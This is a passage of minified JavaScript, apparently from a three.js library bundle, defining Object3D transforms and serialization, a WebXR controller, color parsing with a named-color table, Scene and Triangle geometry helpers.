Zx{constructor(){this.mask=1}set(e){this.mask=(1<<e|0)>>>0}enable(e){this.mask|=1<<e|0}enableAll(){this.mask=-1}toggle(e){this.mask^=1<<e|0}disable(e){this.mask&=~(1<<e|0)}disableAll(){this.mask=0}test(e){return(this.mask&e.mask)!==0}isEnabled(e){return(this.mask&(1<<e|0))!==0}}let lb=0;const Ov=new it,Vs=new ro,ba=new cn,Kc=new it,sl=new it,cb=new it,ub=new ro,Pv=new it(1,0,0),Iv=new it(0,1,0),zv=new it(0,0,1),Bv={type:"added"},fb={type:"removed"},Xs={type:"childadded",child:null},Ch={type:"childremoved",child:null};class kn extends Jr{constructor(){super(),this.isObject3D=!0,Object.defineProperty(this,"id",{value:lb++}),this.uuid=yl(),this.name="",this.type="Object3D",this.parent=null,this.children=[],this.up=kn.DEFAULT_UP.clone();const e=new it,i=new Qr,s=new ro,c=new it(1,1,1);function f(){s.setFromEuler(i,!1)}function d(){i.setFromQuaternion(s,void 0,!1)}i._onChange(f),s._onChange(d),Object.defineProperties(this,{position:{configurable:!0,enumerable:!0,value:e},rotation:{configurable:!0,enumerable:!0,value:i},quaternion:{configurable:!0,enumerable:!0,value:s},scale:{configurable:!0,enumerable:!0,value:c},modelViewMatrix:{value:new cn},normalMatrix:{value:new de}}),this.matrix=new cn,this.matrixWorld=new cn,this.matrixAutoUpdate=kn.DEFAULT_MATRIX_AUTO_UPDATE,this.matrixWorldAutoUpdate=kn.DEFAULT_MATRIX_WORLD_AUTO_UPDATE,this.matrixWorldNeedsUpdate=!1,this.layers=new Zx,this.visible=!0,this.castShadow=!1,this.receiveShadow=!1,this.frustumCulled=!0,this.renderOrder=0,this.animations=[],this.customDepthMaterial=void 0,this.customDistanceMaterial=void 0,this.static=!1,this.userData={},this.pivot=null}onBeforeShadow(){}onAfterShadow(){}onBeforeRender(){}onAfterRender(){}applyMatrix4(e){this.matrixAutoUpdate&&this.updateMatrix(),this.matrix.premultiply(e),this.matrix.decompose(this.position,this.quaternion,this.scale)}applyQuaternion(e){return this.quaternion.premultiply(e),this}setRotationFromAxisAngle(e,i){this.quaternion.setFromAxisAngle(e,i)}setRotationFromEuler(e){this.quaternion.setFromEuler(e,!0)}setRotationFromMatrix(e){this.quaternion.setFromRotationMatrix(e)}setRotationFromQuaternion(e){this.quaternion.copy(e)}rotateOnAxis(e,i){return Vs.setFromAxisAngle(e,i),this.quaternion.multiply(Vs),this}rotateOnWorldAxis(e,i){return Vs.setFromAxisAngle(e,i),this.quaternion.premultiply(Vs),this}rotateX(e){return this.rotateOnAxis(Pv,e)}rotateY(e){return this.rotateOnAxis(Iv,e)}rotateZ(e){return this.rotateOnAxis(zv,e)}translateOnAxis(e,i){return Ov.copy(e).applyQuaternion(this.quaternion),this.position.add(Ov.multiplyScalar(i)),this}translateX(e){return this.translateOnAxis(Pv,e)}translateY(e){return this.translateOnAxis(Iv,e)}translateZ(e){return this.translateOnAxis(zv,e)}localToWorld(e){return this.updateWorldMatrix(!0,!1),e.applyMatrix4(this.matrixWorld)}worldToLocal(e){return this.updateWorldMatrix(!0,!1),e.applyMatrix4(ba.copy(this.matrixWorld).invert())}lookAt(e,i,s){e.isVector3?Kc.copy(e):Kc.set(e,i,s);const c=this.parent;this.updateWorldMatrix(!0,!1),sl.setFromMatrixPosition(this.matrixWorld),this.isCamera||this.isLight?ba.lookAt(sl,Kc,this.up):ba.lookAt(Kc,sl,this.up),this.quaternion.setFromRotationMatrix(ba),c&&(ba.extractRotation(c.matrixWorld),Vs.setFromRotationMatrix(ba),this.quaternion.premultiply(Vs.invert()))}add(e){if(arguments.length>1){for(let i=0;i<arguments.length;i++)this.add(arguments[i]);return this}return e===this?(Ie("Object3D.add: object can't be added as a child of itself.",e),this):(e&&e.isObject3D?(e.removeFromParent(),e.parent=this,this.children.push(e),e.dispatchEvent(Bv),Xs.child=e,this.dispatchEvent(Xs),Xs.child=null):Ie("Object3D.add: object not an instance of THREE.Object3D.",e),this)}remove(e){if(arguments.length>1){for(let s=0;s<arguments.length;s++)this.remove(arguments[s]);return this}const i=this.children.indexOf(e);return i!==-1&&(e.parent=null,this.children.splice(i,1),e.dispatchEvent(fb),Ch.child=e,this.dispatchEvent(Ch),Ch.child=null),this}removeFromParent(){const e=this.parent;return e!==null&&e.remove(this),this}clear(){return this.remove(...this.children)}attach(e){return this.updateWorldMatrix(!0,!1),ba.copy(this.matrixWorld).invert(),e.parent!==null&&(e.parent.updateWorldMatrix(!0,!1),ba.multiply(e.parent.matrixWorld)),e.applyMatrix4(ba),e.removeFromParent(),e.parent=this,this.children.push(e),e.updateWorldMatrix(!1,!0),e.dispatchEvent(Bv),Xs.child=e,this.dispatchEvent(Xs),Xs.child=null,this}getObjectById(e){return this.getObjectByProperty("id",e)}getObjectByName(e){return this.getObjectByProperty("name",e)}getObjectByProperty(e,i){if(this[e]===i)return this;for(let s=0,c=this.children.length;s<c;s++){const d=this.children[s].getObjectByProperty(e,i);if(d!==void 0)return d}}getObjectsByProperty(e,i,s=[]){this[e]===i&&s.push(this);const c=this.children;for(let f=0,d=c.length;f<d;f++)c[f].getObjectsByProperty(e,i,s);return s}getWorldPosition(e){return this.updateWorldMatrix(!0,!1),e.setFromMatrixPosition(this.matrixWorld)}getWorldQuaternion(e){return this.updateWorldMatrix(!0,!1),this.matrixWorld.decompose(sl,e,cb),e}getWorldScale(e){return this.updateWorldMatrix(!0,!1),this.matrixWorld.decompose(sl,ub,e),e}getWorldDirection(e){this.updateWorldMatrix(!0,!1);const i=this.matrixWorld.elements;return e.set(i[8],i[9],i[10]).normalize()}raycast(){}intersectsFrustum(){}traverse(e){e(this);const i=this.children;for(let s=0,c=i.length;s<c;s++)i[s].traverse(e)}traverseVisible(e){if(this.visible===!1)return;e(this);const i=this.children;for(let s=0,c=i.length;s<c;s++)i[s].traverseVisible(e)}traverseAncestors(e){const i=this.parent;i!==null&&(e(i),i.traverseAncestors(e))}updateMatrix(){this.matrix.compose(this.position,this.quaternion,this.scale);const e=this.pivot;if(e!==null){const i=e.x,s=e.y,c=e.z,f=this.matrix.elements;f[12]+=i-f[0]*i-f[4]*s-f[8]*c,f[13]+=s-f[1]*i-f[5]*s-f[9]*c,f[14]+=c-f[2]*i-f[6]*s-f[10]*c}this.matrixWorldNeedsUpdate=!0}updateMatrixWorld(e){this.matrixAutoUpdate&&this.updateMatrix(),(this.matrixWorldNeedsUpdate||e)&&(this.matrixWorldAutoUpdate===!0&&(this.parent===null?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix)),this.matrixWorldNeedsUpdate=!1,e=!0);const i=this.children;for(let s=0,c=i.length;s<c;s++)i[s].updateMatrixWorld(e)}updateWorldMatrix(e,i,s=!1){const c=this.parent;if(e===!0&&c!==null&&c.updateWorldMatrix(!0,!1),this.matrixAutoUpdate&&this.updateMatrix(),(this.matrixWorldNeedsUpdate||s)&&(this.matrixWorldAutoUpdate===!0&&(this.parent===null?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix)),this.matrixWorldNeedsUpdate=!1,s=!0),i===!0){const f=this.children;for(let d=0,h=f.length;d<h;d++)f[d].updateWorldMatrix(!1,!0,s)}}toJSON(e){const i=e===void 0||typeof e=="string",s={};i&&(e={geometries:{},materials:{},textures:{},images:{},shapes:{},skeletons:{},animations:{},nodes:{}},s.metadata={version:4.7,type:"Object",generator:"Object3D.toJSON"});const c={};c.uuid=this.uuid,c.type=this.type,c.name=this.name,c.castShadow=this.castShadow,c.receiveShadow=this.receiveShadow,c.visible=this.visible,c.frustumCulled=this.frustumCulled,c.renderOrder=this.renderOrder,c.static=this.static,c.matrixAutoUpdate=this.matrixAutoUpdate,Object.keys(this.userData).length>0&&(c.userData=this.userData),c.layers=this.layers.mask,c.matrix=this.matrix.toArray(),c.up=this.up.toArray(),this.pivot!==null&&(c.pivot=this.pivot.toArray()),this.morphTargetDictionary!==void 0&&(c.morphTargetDictionary=Object.assign({},this.morphTargetDictionary)),this.morphTargetInfluences!==void 0&&(c.morphTargetInfluences=this.morphTargetInfluences.slice()),this.isInstancedMesh&&(c.type="InstancedMesh",c.count=this.count,c.instanceMatrix=this.instanceMatrix.toJSON(),this.instanceColor!==null&&(c.instanceColor=this.instanceColor.toJSON())),this.isBatchedMesh&&(c.type="BatchedMesh",c.perObjectFrustumCulled=this.perObjectFrustumCulled,c.sortObjects=this.sortObjects,c.drawRanges=this._drawRanges,c.reservedRanges=this._reservedRanges,c.geometryInfo=this._geometryInfo.map(h=>({...h,boundingBox:h.boundingBox?h.boundingBox.toJSON():void 0,boundingSphere:h.boundingSphere?h.boundingSphere.toJSON():void 0})),c.instanceInfo=this._instanceInfo.map(h=>({...h})),c.availableInstanceIds=this._availableInstanceIds.slice(),c.availableGeometryIds=this._availableGeometryIds.slice(),c.nextIndexStart=this._nextIndexStart,c.nextVertexStart=this._nextVertexStart,c.geometryCount=this._geometryCount,c.maxInstanceCount=this._maxInstanceCount,c.maxVertexCount=this._maxVertexCount,c.maxIndexCount=this._maxIndexCount,c.geometryInitialized=this._geometryInitialized,c.matricesTexture=this._matricesTexture.toJSON(e),c.indirectTexture=this._indirectTexture.toJSON(e),this._colorsTexture!==null&&(c.colorsTexture=this._colorsTexture.toJSON(e)),this.boundingSphere!==null&&(c.boundingSphere=this.boundingSphere.toJSON()),this.boundingBox!==null&&(c.boundingBox=this.boundingBox.toJSON()));function f(h,m){return h[m.uuid]===void 0&&(h[m.uuid]=m.toJSON(e)),m.uuid}if(this.isScene)this.background&&(this.background.isColor?c.background=this.background.toJSON():this.background.isTexture&&(c.background=this.background.toJSON(e).uuid)),this.environment&&this.environment.isTexture&&this.environment.isRenderTargetTexture!==!0&&(c.environment=this.environment.toJSON(e).uuid);else if(this.isMesh||this.isLine||this.isPoints){c.geometry=f(e.geometries,this.geometry);const h=this.geometry.parameters;if(h!==void 0&&h.shapes!==void 0){const m=h.shapes;if(Array.isArray(m))for(let p=0,x=m.length;p<x;p++){const v=m[p];f(e.shapes,v)}else f(e.shapes,m)}}if(this.isSkinnedMesh&&(c.bindMode=this.bindMode,c.bindMatrix=this.bindMatrix.toArray(),this.skeleton!==void 0&&(f(e.skeletons,this.skeleton),c.skeleton=this.skeleton.uuid)),this.material!==void 0)if(Array.isArray(this.material)){const h=[];for(let m=0,p=this.material.length;m<p;m++)h.push(f(e.materials,this.material[m]));c.material=h}else c.material=f(e.materials,this.material);if(this.children.length>0){c.children=[];for(let h=0;h<this.children.length;h++)c.children.push(this.children[h].toJSON(e).object)}if(this.animations.length>0){c.animations=[];for(let h=0;h<this.animations.length;h++){const m=this.animations[h];c.animations.push(f(e.animations,m))}}if(i){const h=d(e.geometries),m=d(e.materials),p=d(e.textures),x=d(e.images),v=d(e.shapes),_=d(e.skeletons),E=d(e.animations),T=d(e.nodes);h.length>0&&(s.geometries=h),m.length>0&&(s.materials=m),p.length>0&&(s.textures=p),x.length>0&&(s.images=x),v.length>0&&(s.shapes=v),_.length>0&&(s.skeletons=_),E.length>0&&(s.animations=E),T.length>0&&(s.nodes=T)}return s.object=c,s;function d(h){const m=[];for(const p in h){const x=h[p];delete x.metadata,m.push(x)}return m}}clone(e){return new this.constructor().copy(this,e)}copy(e,i=!0){if(this.name=e.name,this.up.copy(e.up),this.position.copy(e.position),this.rotation.order=e.rotation.order,this.quaternion.copy(e.quaternion),this.scale.copy(e.scale),this.pivot=e.pivot!==null?e.pivot.clone():null,this.matrix.copy(e.matrix),this.matrixWorld.copy(e.matrixWorld),this.matrixAutoUpdate=e.matrixAutoUpdate,this.matrixWorldAutoUpdate=e.matrixWorldAutoUpdate,this.matrixWorldNeedsUpdate=e.matrixWorldNeedsUpdate,this.layers.mask=e.layers.mask,this.visible=e.visible,this.castShadow=e.castShadow,this.receiveShadow=e.receiveShadow,this.frustumCulled=e.frustumCulled,this.renderOrder=e.renderOrder,this.static=e.static,this.animations=e.animations.slice(),this.userData=JSON.parse(JSON.stringify(e.userData)),i===!0)for(let s=0;s<e.children.length;s++){const c=e.children[s];this.add(c.clone())}return this}dispose(){this.dispatchEvent({type:"dispose"})}}kn.DEFAULT_UP=new it(0,1,0);kn.DEFAULT_MATRIX_AUTO_UPDATE=!0;kn.DEFAULT_MATRIX_WORLD_AUTO_UPDATE=!0;class jc extends kn{constructor(){super(),this.isGroup=!0,this.type="Group"}}const db={type:"move"};class wh{constructor(){this._targetRay=null,this._grip=null,this._hand=null}getHandSpace(){return this._hand===null&&(this._hand=new jc,this._hand.matrixAutoUpdate=!1,this._hand.visible=!1,this._hand.joints={},this._hand.inputState={pinching:!1}),this._hand}getTargetRaySpace(){return this._targetRay===null&&(this._targetRay=new jc,this._targetRay.matrixAutoUpdate=!1,this._targetRay.visible=!1,this._targetRay.hasLinearVelocity=!1,this._targetRay.linearVelocity=new it,this._targetRay.hasAngularVelocity=!1,this._targetRay.angularVelocity=new it),this._targetRay}getGripSpace(){return this._grip===null&&(this._grip=new jc,this._grip.matrixAutoUpdate=!1,this._grip.visible=!1,this._grip.hasLinearVelocity=!1,this._grip.linearVelocity=new it,this._grip.hasAngularVelocity=!1,this._grip.angularVelocity=new it,this._grip.eventsEnabled=!1),this._grip}dispatchEvent(e){return this._targetRay!==null&&this._targetRay.dispatchEvent(e),this._grip!==null&&this._grip.dispatchEvent(e),this._hand!==null&&this._hand.dispatchEvent(e),this}connect(e){if(e&&e.hand){const i=this._hand;if(i)for(const s of e.hand.values())this._getHandJoint(i,s)}return this.dispatchEvent({type:"connected",data:e}),this}disconnect(e){return this.dispatchEvent({type:"disconnected",data:e}),this._targetRay!==null&&(this._targetRay.visible=!1),this._grip!==null&&(this._grip.visible=!1),this._hand!==null&&(this._hand.visible=!1),this}update(e,i,s){let c=null,f=null,d=null;const h=this._targetRay,m=this._grip,p=this._hand;if(e&&i.session.visibilityState!=="visible-blurred"){if(p&&e.hand){d=!0;for(const w of e.hand.values()){const y=i.getJointPose(w,s),S=this._getHandJoint(p,w);y!==null&&(S.matrix.fromArray(y.transform.matrix),S.matrix.decompose(S.position,S.rotation,S.scale),S.matrixWorldNeedsUpdate=!0,S.jointRadius=y.radius),S.visible=y!==null}const x=p.joints["index-finger-tip"],v=p.joints["thumb-tip"],_=x.position.distanceTo(v.position),E=.02,T=.005;p.inputState.pinching&&_>E+T?(p.inputState.pinching=!1,this.dispatchEvent({type:"pinchend",handedness:e.handedness,target:this})):!p.inputState.pinching&&_<=E-T&&(p.inputState.pinching=!0,this.dispatchEvent({type:"pinchstart",handedness:e.handedness,target:this}))}else m!==null&&e.gripSpace&&(f=i.getPose(e.gripSpace,s),f!==null&&(m.matrix.fromArray(f.transform.matrix),m.matrix.decompose(m.position,m.rotation,m.scale),m.matrixWorldNeedsUpdate=!0,f.linearVelocity?(m.hasLinearVelocity=!0,m.linearVelocity.copy(f.linearVelocity)):m.hasLinearVelocity=!1,f.angularVelocity?(m.hasAngularVelocity=!0,m.angularVelocity.copy(f.angularVelocity)):m.hasAngularVelocity=!1,m.eventsEnabled&&m.dispatchEvent({type:"gripUpdated",data:e,target:this})));h!==null&&(c=i.getPose(e.targetRaySpace,s),c===null&&f!==null&&(c=f),c!==null&&(h.matrix.fromArray(c.transform.matrix),h.matrix.decompose(h.position,h.rotation,h.scale),h.matrixWorldNeedsUpdate=!0,c.linearVelocity?(h.hasLinearVelocity=!0,h.linearVelocity.copy(c.linearVelocity)):h.hasLinearVelocity=!1,c.angularVelocity?(h.hasAngularVelocity=!0,h.angularVelocity.copy(c.angularVelocity)):h.hasAngularVelocity=!1,this.dispatchEvent(db)))}return h!==null&&(h.visible=c!==null),m!==null&&(m.visible=f!==null),p!==null&&(p.visible=d!==null),this}_getHandJoint(e,i){if(e.joints[i.jointName]===void 0){const s=new jc;s.matrixAutoUpdate=!1,s.visible=!1,e.joints[i.jointName]=s,e.add(s)}return e.joints[i.jointName]}}const Kx={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,rebeccapurple:6697881,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074},fr={h:0,s:0,l:0},Qc={h:0,s:0,l:0};function Nh(o,e,i){return i<0&&(i+=1),i>1&&(i-=1),i<1/6?o+(e-o)*6*i:i<1/2?e:i<2/3?o+(e-o)*6*(2/3-i):o}class ze{constructor(e,i,s){return this.isColor=!0,this.r=1,this.g=1,this.b=1,this.set(e,i,s)}set(e,i,s){if(i===void 0&&s===void 0){const c=e;c&&c.isColor?this.copy(c):typeof c=="number"?this.setHex(c):typeof c=="string"&&this.setStyle(c)}else this.setRGB(e,i,s);return this}setScalar(e){return this.r=e,this.g=e,this.b=e,this}setHex(e,i=bi){return e=Math.floor(e),this.r=(e>>16&255)/255,this.g=(e>>8&255)/255,this.b=(e&255)/255,we.colorSpaceToWorking(this,i),this}setRGB(e,i,s,c=we.workingColorSpace){return this.r=e,this.g=i,this.b=s,we.colorSpaceToWorking(this,c),this}setHSL(e,i,s,c=we.workingColorSpace){if(e=$E(e,1),i=Ne(i,0,1),s=Ne(s,0,1),i===0)this.r=this.g=this.b=s;else{const f=s<=.5?s*(1+i):s+i-s*i,d=2*s-f;this.r=Nh(d,f,e+1/3),this.g=Nh(d,f,e),this.b=Nh(d,f,e-1/3)}return we.colorSpaceToWorking(this,c),this}setStyle(e,i=bi){function s(f){f!==void 0&&parseFloat(f)<1&&se("Color: Alpha component of "+e+" will be ignored.")}let c;if(c=/^(\w+)\(([^\)]*)\)/.exec(e)){let f;const d=c[1],h=c[2];switch(d){case"rgb":case"rgba":if(f=/^\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(h))return s(f[4]),this.setRGB(Math.min(255,parseInt(f[1],10))/255,Math.min(255,parseInt(f[2],10))/255,Math.min(255,parseInt(f[3],10))/255,i);if(f=/^\s*(\d+)\%\s*,\s*(\d+)\%\s*,\s*(\d+)\%\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(h))return s(f[4]),this.setRGB(Math.min(100,parseInt(f[1],10))/100,Math.min(100,parseInt(f[2],10))/100,Math.min(100,parseInt(f[3],10))/100,i);break;case"hsl":case"hsla":if(f=/^\s*(\d*\.?\d+)\s*,\s*(\d*\.?\d+)\%\s*,\s*(\d*\.?\d+)\%\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(h))return s(f[4]),this.setHSL(parseFloat(f[1])/360,parseFloat(f[2])/100,parseFloat(f[3])/100,i);break;default:se("Color: Unknown color model "+e)}}else if(c=/^\#([A-Fa-f\d]+)$/.exec(e)){const f=c[1],d=f.length;if(d===3)return this.setRGB(parseInt(f.charAt(0),16)/15,parseInt(f.charAt(1),16)/15,parseInt(f.charAt(2),16)/15,i);if(d===6)return this.setHex(parseInt(f,16),i);se("Color: Invalid hex color "+e)}else if(e&&e.length>0)return this.setColorName(e,i);return this}setColorName(e,i=bi){const s=Kx[e.toLowerCase()];return s!==void 0?this.setHex(s,i):se("Color: Unknown color "+e),this}clone(){return new this.constructor(this.r,this.g,this.b)}copy(e){return this.r=e.r,this.g=e.g,this.b=e.b,this}copySRGBToLinear(e){return this.r=Ua(e.r),this.g=Ua(e.g),this.b=Ua(e.b),this}copyLinearToSRGB(e){return this.r=no(e.r),this.g=no(e.g),this.b=no(e.b),this}convertSRGBToLinear(){return this.copySRGBToLinear(this),this}convertLinearToSRGB(){return this.copyLinearToSRGB(this),this}getHex(e=bi){return we.workingToColorSpace(Pn.copy(this),e),Math.round(Ne(Pn.r*255,0,255))*65536+Math.round(Ne(Pn.g*255,0,255))*256+Math.round(Ne(Pn.b*255,0,255))}getHexString(e=bi){return("000000"+this.getHex(e).toString(16)).slice(-6)}getHSL(e,i=we.workingColorSpace){we.workingToColorSpace(Pn.copy(this),i);const s=Pn.r,c=Pn.g,f=Pn.b,d=Math.max(s,c,f),h=Math.min(s,c,f);let m,p;const x=(h+d)/2;if(h===d)m=0,p=0;else{const v=d-h;switch(p=x<=.5?v/(d+h):v/(2-d-h),d){case s:m=(c-f)/v+(c<f?6:0);break;case c:m=(f-s)/v+2;break;case f:m=(s-c)/v+4;break}m/=6}return e.h=m,e.s=p,e.l=x,e}getRGB(e,i=we.workingColorSpace){return we.workingToColorSpace(Pn.copy(this),i),e.r=Pn.r,e.g=Pn.g,e.b=Pn.b,e}getStyle(e=bi){we.workingToColorSpace(Pn.copy(this),e);const i=Pn.r,s=Pn.g,c=Pn.b;return e!==bi?`color(${e} ${i.toFixed(3)} ${s.toFixed(3)} ${c.toFixed(3)})`:`rgb(${Math.round(i*255)},${Math.round(s*255)},${Math.round(c*255)})`}offsetHSL(e,i,s){return this.getHSL(fr),this.setHSL(fr.h+e,fr.s+i,fr.l+s)}add(e){return this.r+=e.r,this.g+=e.g,this.b+=e.b,this}addColors(e,i){return this.r=e.r+i.r,this.g=e.g+i.g,this.b=e.b+i.b,this}addScalar(e){return this.r+=e,this.g+=e,this.b+=e,this}sub(e){return this.r=Math.max(0,this.r-e.r),this.g=Math.max(0,this.g-e.g),this.b=Math.max(0,this.b-e.b),this}multiply(e){return this.r*=e.r,this.g*=e.g,this.b*=e.b,this}multiplyScalar(e){return this.r*=e,this.g*=e,this.b*=e,this}lerp(e,i){return this.r+=(e.r-this.r)*i,this.g+=(e.g-this.g)*i,this.b+=(e.b-this.b)*i,this}lerpColors(e,i,s){return this.r=e.r+(i.r-e.r)*s,this.g=e.g+(i.g-e.g)*s,this.b=e.b+(i.b-e.b)*s,this}lerpHSL(e,i){this.getHSL(fr),e.getHSL(Qc);const s=Eh(fr.h,Qc.h,i),c=Eh(fr.s,Qc.s,i),f=Eh(fr.l,Qc.l,i);return this.setHSL(s,c,f),this}setFromVector3(e){return this.r=e.x,this.g=e.y,this.b=e.z,this}applyMatrix3(e){const i=this.r,s=this.g,c=this.b,f=e.elements;return this.r=f[0]*i+f[3]*s+f[6]*c,this.g=f[1]*i+f[4]*s+f[7]*c,this.b=f[2]*i+f[5]*s+f[8]*c,this}equals(e){return e.r===this.r&&e.g===this.g&&e.b===this.b}fromArray(e,i=0){return this.r=e[i],this.g=e[i+1],this.b=e[i+2],this}toArray(e=[],i=0){return e[i]=this.r,e[i+1]=this.g,e[i+2]=this.b,e}fromBufferAttribute(e,i){return this.r=e.getX(i),this.g=e.getY(i),this.b=e.getZ(i),this}toJSON(){return this.getHex()}*[Symbol.iterator](){yield this.r,yield this.g,yield this.b}}const Pn=new ze;ze.NAMES=Kx;class hb extends kn{constructor(){super(),this.isScene=!0,this.type="Scene",this.background=null,this.environment=null,this.fog=null,this.backgroundBlurriness=0,this.backgroundIntensity=1,this.backgroundRotation=new Qr,this.environmentIntensity=1,this.environmentRotation=new Qr,this.overrideMaterial=null,typeof __THREE_DEVTOOLS__<"u"&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe",{detail:this}))}copy(e,i){return super.copy(e,i),e.background!==null&&(this.background=e.background.clone()),e.environment!==null&&(this.environment=e.environment.clone()),e.fog!==null&&(this.fog=e.fog.clone()),this.backgroundBlurriness=e.backgroundBlurriness,this.backgroundIntensity=e.backgroundIntensity,this.backgroundRotation.copy(e.backgroundRotation),this.environmentIntensity=e.environmentIntensity,this.environmentRotation.copy(e.environmentRotation),e.overrideMaterial!==null&&(this.overrideMaterial=e.overrideMaterial.clone()),this.matrixAutoUpdate=e.matrixAutoUpdate,this}toJSON(e){const i=super.toJSON(e);return this.fog!==null&&(i.object.fog=this.fog.toJSON()),i.object.backgroundBlurriness=this.backgroundBlurriness,i.object.backgroundIntensity=this.backgroundIntensity,i.object.backgroundRotation=this.backgroundRotation.toArray(),i.object.environmentIntensity=this.environmentIntensity,i.object.environmentRotation=this.environmentRotation.toArray(),i}}const Oi=new it,Ta=new it,Dh=new it,Aa=new it,ks=new it,Ws=new it,Fv=new it,Uh=new it,Lh=new it,Oh=new it,Ph=new ln,Ih=new ln,zh=new ln;class Ii{constructor(e=new it,i=new it,s=new it){this.a=e,this.b=i,this.c=s}static getNormal(e,i,s,c){c.subVectors(s,i),Oi.subVectors(e,i),c.cross(Oi);const f=c.lengthSq();return f>0?c.multiplyScalar(1/Math.sqrt(f)):c.set(0,0,0)}static getBarycoord(e,i,s,c,f){Oi.subVectors(c,i),Ta.subVectors(s,i),Dh.subVectors(e,i);const d=Oi.dot(Oi),h=Oi.dot(Ta),m=Oi.dot(Dh),p=Ta.dot(Ta),x=Ta.dot(Dh),v=d*p-h*h;if(v===0)return f.set(0,0,0),null;const _=1/v,E=(p*m-h*x)*_,T=(d*x-h*m)*_;return f.set(1-E-T,T,E)}static containsPoint(e,i,s,c){return this.getBarycoord(e,i,s,c,Aa)===null?!1:Aa.x>=0&&Aa.y>=0&&Aa.x+Aa.y<=1}static getInterpolation(e,i,s,c,f,d,h,m){return this.getBarycoord(e,i,s,c,Aa)===null?(m.x=0,m.y=0,"z"in m&&(m.z=0),"w"in m&&(m.w=0),null):(m.setScalar(0),m.addScaledVector(f,Aa.x),m.addScaledVector(d,Aa.y),m.addScaledVector(h,Aa.z),m)}static getInterpolatedAttribute(e,i,s,c,f,d){return Ph.setScalar(0),Ih.setScalar(0),zh.setScalar(0),Ph.fromBufferAttribute(e,i),Ih.fromBufferAttribute(e,s),zh.fromBufferAttribute(e,c),d.setScalar(0),d.addScaledVector(Ph,f.x),d.addScaledVector(Ih,f.y),d.addScaledVector(zh,f.z),d}static isFrontFacing(e,i,s,c){return Oi.subVectors(s,i),Ta.subVectors(e,i),Oi.cross(Ta).dot(c)<0}set(e,i,s){return this.a.copy(e),this.b.copy(i),this.c.copy(s),this}setFromPointsAndIndices(e,i,s,c){return this.a.copy(e[i]),this.b.copy(e[s]),this.c.copy(e[c]),this}setFromAttributeAndIndices(e,i,s,c){return this.a.fromBufferAttribute(e,i),this.b.fromBufferAttribute(e,s),this.c.fromBufferAttribute(e,c),this}clone(){return new this.constructor().copy(this)}copy(e){return this.a.copy(e.a),this.b.copy(e.b),this.c.copy(e.c),this}getArea(){return Oi.subVectors(this.c,this.b),Ta.subVectors(this.a,this.b),Oi.cross(Ta).length()*.5}getMidpoint(e){return e.addVectors(this.a,this.b).add(this.c).multiplyScalar(1/3)}getNormal(e){return Ii.getNormal(this.a,this.b,this.c,e)}getPlane(e){return e.setFromCoplanarPoints(this.a,this.b,this.c)}getBarycoord(e,i){return Ii.getBarycoord(e,this.a,this.b,this.c,i)}getInterpolation(e,i,s,c,f){return Ii.getInterpolation(e,this.a,this.b,this.c,i,s,c,f)}containsPoint(e){return Ii.containsPoint(e,this.a,this.b,this.c)}isFrontFacing(e){return Ii.isFrontFacing(this.a,this.b,this.c,e)}intersectsBox(e){return e.intersectsTriangle(this)}closestPointToPoint(e,i){const s=this.a,c=this.b,f=this.c;let d,h;ks.subVectors(c,s),Ws.subVectors(f,s),Uh.subVectors(e,s);const m=ks.dot(Uh),p=Ws.dot(Uh);if(m<=0&&p<=0)return i.copy(s);Lh.subVectors(e,c);const x=ks.dot(Lh),v=Ws.dot(Lh);if(x>=0&&v<=x)return i.copy(c);const _=m*v-x*p;if(_<=0&&m>=0&&x<=0)return 